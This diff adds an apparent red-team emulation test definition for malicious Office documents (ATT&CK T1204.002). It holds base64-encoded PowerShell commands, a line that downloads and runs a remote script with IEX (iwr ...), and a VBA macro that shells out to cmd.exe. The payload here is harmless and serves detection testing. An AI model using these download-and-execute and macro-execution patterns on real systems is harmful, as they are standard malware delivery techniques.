@@ -1,0 +1,21 @@
+- id: 44d79187-dc1e-5e33-bdd9-2b798e830490
+  name: Soumaia ART Tests - Maldoc choice flags command execution
+  description: 'This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
+
+    Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.'
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBXAG8AcgBkAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACQAcAByAG8AYwBlAHMAcwAgAD0AIAAiAFcAbwByAGQAIgA7ACAAaQBmACAAKAAgACQAcAByAG8AYwBlAHMAcwAgAC0AZQBxACAAIgBXAG8AcgBkACIAKQAgAHsAJABwAHIAbwBjAGUAcwBzACAAPQAgACIAdwBpAG4AdwBvAHIAZAAiAH0ACgAgACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAkAHAAcgBvAGMAZQBzAHMACgAgACAAZQB4AGkAdAAgADAACgB9ACAAYwBhAHQAYwBoACAAewAgAGUAeABpAHQAIAAxACAAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA
+          }
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+          $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
+          Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
